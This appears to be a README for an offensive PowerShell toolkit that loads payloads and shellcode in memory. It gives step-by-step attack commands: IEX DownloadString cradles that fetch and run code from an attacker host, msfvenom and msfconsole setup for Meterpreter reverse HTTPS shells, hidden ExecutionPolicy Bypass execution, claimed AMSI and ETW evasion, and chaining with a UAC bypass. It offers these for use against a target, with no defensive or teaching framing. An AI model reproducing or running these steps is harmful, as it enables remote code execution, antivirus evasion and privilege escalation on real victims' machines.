# Reflective PowerShell Loader

## Files

| File | Purpose |
|---|---|
| `ps-loader.ps1` | Downloads a PowerShell payload over HTTP and executes it entirely in memory |
| `ps-shellcode-runner.ps1` | Reflection-based shellcode runner — resolves WinAPI via `LookupFunc`, allocates and executes shellcode in memory |

## Usage

**1. Update the payload URL in `ps-loader.ps1`:**
```powershell
$PayloadUrl = "http://<IP>/payload.ps1"
```

**2. Host your payload on your HTTP server:**
```bash
python3 -m http.server 80
```

**3. Start your listener:**
```bash
msfconsole -q -x "
    use multi/handler;
    set payload windows/x64/meterpreter/reverse_https;
    set LHOST <IP>;
    set LPORT 443;
    run"
```

**4. Deliver and execute on the target** from a PowerShell session:
```powershell
# Download and run the loader itself in memory
IEX (New-Object Net.WebClient).DownloadString('http://<IP>/ps-loader.ps1')
```

Or transfer and run directly:
```powershell
powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File ps-loader.ps1
```

---

## Reflection Shellcode Runner (`ps-shellcode-runner.ps1`)

Executes raw shellcode in memory using only PowerShell reflection — no `Add-Type`, no P/Invoke declarations, no imported modules. Resolves `VirtualAlloc`, `CreateThread`, and `WaitForSingleObject` entirely at runtime via `LookupFunc`.

**1. Generate your shellcode:**
```bash
msfvenom -p windows/x64/meterpreter/reverse_https \
    LHOST=<IP> LPORT=443 -f ps1 -o shellcode.ps1
```

**2. Replace the `$buf` in `ps-shellcode-runner.ps1`:**
```powershell
[Byte[]] $buf = 0xfc,0x48,0x83,0xe4,0xf0,...  # ← paste your full shellcode bytes here
```

**3. Start your listener:**
```bash
msfconsole -q -x "
    use multi/handler;
    set payload windows/x64/meterpreter/reverse_https;
    set LHOST <IP>;
    set LPORT 443;
    run"
```

**4. Run on the target:**
```powershell
# Transfer and execute
powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File ps-shellcode-runner.ps1

# Or load directly into memory from your server
IEX (New-Object Net.WebClient).DownloadString('http://<IP>/ps-shellcode-runner.ps1')
```

> Pair with `ps-loader.ps1` to have the loader download and IEX the shellcode runner — AMSI and ETW are killed before the shellcode bytes ever get scanned.

----

## Chaining with UAC Bypass

If you need elevated execution, chain with `uac-bypass.ps1` — set the payload in the UAC bypass to download and run this loader:

```powershell
# In uac-bypass.ps1:
$payload = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -c " +
           "`"IEX(New-Object Net.WebClient).DownloadString('http://<IP>/ps-loader.ps1')`""
```
